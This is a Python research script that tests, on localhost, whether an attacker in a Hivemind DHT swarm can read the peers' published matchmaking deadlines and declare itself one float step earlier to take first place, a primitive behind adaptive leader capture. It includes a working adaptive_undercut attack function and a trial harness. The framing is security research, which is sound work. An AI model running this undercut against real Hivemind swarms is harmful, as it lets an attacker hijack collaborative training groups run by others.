"""
Track 1, stage A -- can an attacker adaptively take first place in a real Hivemind DHT view?

This is the smallest test of the practical primitive behind adaptive leader capture. It runs
Hivemind's real DHTNode/libp2p implementation on localhost; it does not reimplement the election.
Five honest peers publish heterogeneous deadlines that are hidden from the attack function. The
attacker reads the actual DHT records, selects the earliest deadline with enough time left to join,
and publishes one floating-point step before it. A separate observer verifies the resulting DHT view.

This stage proves record visibility and ordering only, not group leadership. The next stage may run
only if the smoke trial passes and at least 9 of 10 confirmation trials pass every invariant.

The target group key is necessarily known: a participant cannot query or publish on an unknown DHT
key. What the attacker does not know in advance is the honest timing configuration or deadlines.

Run:

    .venv/bin/python research/step14_adaptive_leader.py --phase smoke
    .venv/bin/python research/step14_adaptive_leader.py --phase confirm
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import random
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import numpy as np

from hivemind.averaging.key_manager import GroupKeyManager
from hivemind.dht.node import DHTNode
from hivemind.p2p import PeerID
from hivemind.utils.timed_storage import get_dht_time

RESULTS_DIR = Path(__file__).resolve().parent / "results"
LOCALHOST = ["/ip4/127.0.0.1/tcp/0"]


class NodeAsDHT:
    """Use GroupKeyManager with a DHTNode while preserving real DHT RPCs."""

    def __init__(self, node: DHTNode):
        self._node = node
        self.peer_id = node.peer_id

    async def store(self, *args, return_future: bool = False, **kwargs):
        return await self._node.store(*args, **kwargs)

    async def get(self, *args, return_future: bool = False, **kwargs):
        return await self._node.get(*args, **kwargs)


def manager(node: DHTNode, prefix: str) -> GroupKeyManager:
    return GroupKeyManager(NodeAsDHT(node), prefix=prefix, initial_group_bits="", target_group_size=None)


@dataclass
class AttackObservation:
    seen: list[tuple[PeerID, float]]
    selected_peer: Optional[PeerID]
    selected_expiration: Optional[float]
    attacker_expiration: Optional[float]
    read_finished_at: float
    read_latency_s: float
    write_finished_at: float
    write_latency_s: float
    write_accepted: bool


async def adaptive_undercut(
    attacker: GroupKeyManager,
    group_key: str,
    required_remaining_s: float,
) -> AttackObservation:
    """Choose solely from wire-visible DHT records and publish immediately before the first.

    This function deliberately receives no honest deadlines, RNG, matchmaking interval, or expected
    earliest value. ``required_remaining_s`` is the attacker's operational join budget, not an
    assumption about how honest peers configured matchmaking.
    """
    read_started = time.perf_counter()
    seen = await attacker.get_averagers(group_key, only_active=True)
    read_latency = time.perf_counter() - read_started
    read_finished_at = get_dht_time()

    candidates = [
        (peer_id, expiration)
        for peer_id, expiration in seen
        if peer_id != attacker.peer_id and expiration > read_finished_at + required_remaining_s
    ]
    if not candidates:
        return AttackObservation(
            seen=seen,
            selected_peer=None,
            selected_expiration=None,
            attacker_expiration=None,
            read_finished_at=read_finished_at,
            read_latency_s=read_latency,
            write_finished_at=get_dht_time(),
            write_latency_s=0.0,
            write_accepted=False,
        )

    selected_peer, selected_expiration = min(candidates, key=lambda item: item[1])
    attacker_expiration = float(np.nextafter(selected_expiration, -np.inf))
    write_started = time.perf_counter()
    write_accepted = await attacker.declare_averager(
        group_key, attacker.peer_id, expiration_time=attacker_expiration
    )
    write_latency = time.perf_counter() - write_started
    return AttackObservation(
        seen=seen,
        selected_peer=selected_peer,
        selected_expiration=selected_expiration,
        attacker_expiration=attacker_expiration,
        read_finished_at=read_finished_at,
        read_latency_s=read_latency,
        write_finished_at=get_dht_time(),
        write_latency_s=write_latency,
        write_accepted=bool(write_accepted),
    )


async def build_swarm(honest_count: int):
    bootstrap = await DHTNode.create(host_maddrs=LOCALHOST)
    initial_peers = [str(address) for address in await bootstrap.get_visible_maddrs()]
    honest = [
        await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST)
        for _ in range(honest_count)
    ]
    attacker = await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST)
    observer = await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST)
    return bootstrap, honest, attacker, observer


async def shutdown_nodes(*groups) -> None:
    for group in groups:
        nodes = group if isinstance(group, list) else [group]
        for node in nodes:
            await node.shutdown()


async def run_trials(
    *,
    phase: str,
    trials: int,
    honest_count: int,
    seed: int,
    required_remaining_s: float,
    observer_required_s: float,
    deadline_base_s: float,
    deadline_spread_s: float,
    label: str,
) -> list[dict]:
    rng = random.Random(seed)
    bootstrap, honest, attacker, observer = await build_swarm(honest_count)
    rows: list[dict] = []
    try:
        await asyncio.sleep(0.3)
        for trial in range(trials):
            # A fresh key avoids same-subkey replacement rules carrying state between trials.
            key_nonce = rng.getrandbits(32)
            prefix = f"e14_{label}_{trial}_{key_nonce:08x}"
            group_key = f"{prefix}.0b"
            honest_managers = [manager(node, prefix) for node in honest]
            attacker_manager = manager(attacker, prefix)
            observer_manager = manager(observer, prefix)

            base = get_dht_time() + deadline_base_s
            honest_expirations = [base + rng.uniform(0.0, deadline_spread_s) for _ in honest]
            write_order = list(range(honest_count))
            rng.shuffle(write_order)
            honest_writes = await asyncio.gather(
                *[
                    honest_managers[index].declare_averager(
                        group_key,
                        honest[index].peer_id,
                        expiration_time=honest_expirations[index],
                    )
                    for index in write_order
                ]
            )

            attack = await adaptive_undercut(
                attacker_manager,
                group_key,
                required_remaining_s=required_remaining_s,
            )
            observer_started = time.perf_counter()
            observed = await observer_manager.get_averagers(group_key, only_active=True)
            observer_latency = time.perf_counter() - observer_started
            observer_finished_at = get_dht_time()

            observed_by_id = {peer_id: expiration for peer_id, expiration in observed}
            observed_honest = [
                expiration for peer_id, expiration in observed if peer_id != attacker.peer_id
            ]
            observed_attacker_exp = observed_by_id.get(attacker.peer_id)
            exact_visible = (
                attack.attacker_expiration is not None
                and observed_attacker_exp == attack.attacker_expiration
            )
            attacker_strictly_first = (
                observed_attacker_exp is not None
                and bool(observed_honest)
                and observed_attacker_exp < min(observed_honest)
            )
            remaining_at_observer = (
                observed_attacker_exp - observer_finished_at
                if observed_attacker_exp is not None
                else float("-inf")
            )

            checks = {
                "all_honest_writes": all(bool(value) for value in honest_writes),
                "attacker_saw_all_honest": len(attack.seen) == honest_count,
                "candidate_selected": attack.selected_expiration is not None,
                "attacker_write": attack.write_accepted,
                "observer_saw_all": len(observed) == honest_count + 1,
                "exact_visible": exact_visible,
                "strictly_first": attacker_strictly_first,
                "observer_joinable": remaining_at_observer > observer_required_s,
            }
            passed = all(checks.values())
            failed_checks = ";".join(name for name, value in checks.items() if not value)
            selected_expiration = attack.selected_expiration or float("nan")
            attacker_expiration = attack.attacker_expiration or float("nan")
            rows.append(
                dict(
                    phase=phase,
                    trial=trial,
                    seed=seed,
                    group_key=group_key,
                    honest_count=honest_count,
                    honest_deadline_min_s=f"{min(honest_expirations) - base:.6f}",
                    honest_deadline_max_s=f"{max(honest_expirations) - base:.6f}",
                    honest_writes_accepted=sum(bool(value) for value in honest_writes),
                    attacker_seen=len(attack.seen),
                    selected_peer=str(attack.selected_peer or ""),
                    selected_expiration=f"{selected_expiration:.9f}",
                    attacker_expiration=f"{attacker_expiration:.9f}",
                    undercut_s=f"{selected_expiration - attacker_expiration:.9g}",
                    read_latency_s=f"{attack.read_latency_s:.6f}",
                    write_latency_s=f"{attack.write_latency_s:.6f}",
                    observer_latency_s=f"{observer_latency:.6f}",
                    observer_seen=len(observed),
                    remaining_at_observer_s=f"{remaining_at_observer:.6f}",
                    attacker_write_accepted=int(attack.write_accepted),
                    exact_visible=int(exact_visible),
                    attacker_strictly_first=int(attacker_strictly_first),
                    passed=int(passed),
                    failed_checks=failed_checks,
                )
            )
            print(
                f"  trial {trial:>2}: seen {len(attack.seen)}/{honest_count}, "
                f"observer {len(observed)}/{honest_count + 1}, first={int(attacker_strictly_first)}, "
                f"remaining={remaining_at_observer:.3f}s, pass={passed}"
            )
    finally:
        await shutdown_nodes(bootstrap, honest, attacker, observer)
    return rows


def write_csv(path: Path, rows: list[dict]) -> None:
    with path.open("w", newline="") as output:
        writer = csv.DictWriter(output, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--phase", choices=("smoke", "confirm"), default="smoke")
    parser.add_argument("--trials", type=int, default=None)
    parser.add_argument("--honest", type=int, default=5)
    parser.add_argument("--seed", type=int, default=1414)
    parser.add_argument("--required-remaining", type=float, default=3.5)
    parser.add_argument("--observer-required", type=float, default=3.0)
    parser.add_argument("--deadline-base", type=float, default=7.0)
    parser.add_argument("--deadline-spread", type=float, default=1.5)
    parser.add_argument("--label", default="")
    args = parser.parse_args()

    trials = args.trials if args.trials is not None else (1 if args.phase == "smoke" else 10)
    if args.honest < 2 or trials < 1:
        parser.error("honest must be at least 2 and trials must be positive")
    if not 0 < args.observer_required < args.required_remaining < args.deadline_base:
        parser.error("require 0 < observer-required < required-remaining < deadline-base")
    if args.deadline_spread <= 0:
        parser.error("deadline-spread must be positive")

    label = args.label or datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    print(
        f"Step 14 DHT {args.phase}: {args.honest} hidden honest deadlines, "
        f"{trials} trial(s), seed {args.seed}"
    )
    rows = asyncio.run(
        run_trials(
            phase=args.phase,
            trials=trials,
            honest_count=args.honest,
            seed=args.seed,
            required_remaining_s=args.required_remaining,
            observer_required_s=args.observer_required,
            deadline_base_s=args.deadline_base,
            deadline_spread_s=args.deadline_spread,
            label=label,
        )
    )
    passed = sum(row["passed"] for row in rows)
    required_passes = trials if args.phase == "smoke" else max(1, int(np.ceil(0.9 * trials)))
    gate_passed = passed >= required_passes

    RESULTS_DIR.mkdir(exist_ok=True)
    path = RESULTS_DIR / (
        f"step14_adaptive_dht_{args.phase}_{label}_h{args.honest}_t{trials}_s{args.seed}.csv"
    )
    write_csv(path, rows)
    print(f" result: {passed}/{trials} passed; advancement gate {required_passes}/{trials}: {gate_passed}")
    print(f" wrote {path.relative_to(Path.cwd())}")
    return 0 if gate_passed else 2


if __name__ == "__main__":
    raise SystemExit(main())
